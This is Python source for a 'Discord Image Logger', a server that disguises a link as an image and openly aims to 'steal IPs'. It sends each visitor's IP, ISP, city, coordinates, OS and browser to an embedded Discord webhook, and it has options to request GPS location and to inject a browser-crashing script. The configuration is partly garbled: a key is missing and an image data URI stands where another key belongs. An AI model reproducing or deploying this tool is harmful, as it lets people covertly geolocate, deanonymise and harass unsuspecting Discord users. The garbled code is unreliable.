# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
   "https://discordapp.com/api/webhooks/1109141986365153341/OZ6snUgXYaa74EnbpVREw6AS4irKZt_zhTZUS3lWg-SBHDWhxOlyWwIU0Q97gFL-FPFJ",
    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "data:image/jpeg;base64,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": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
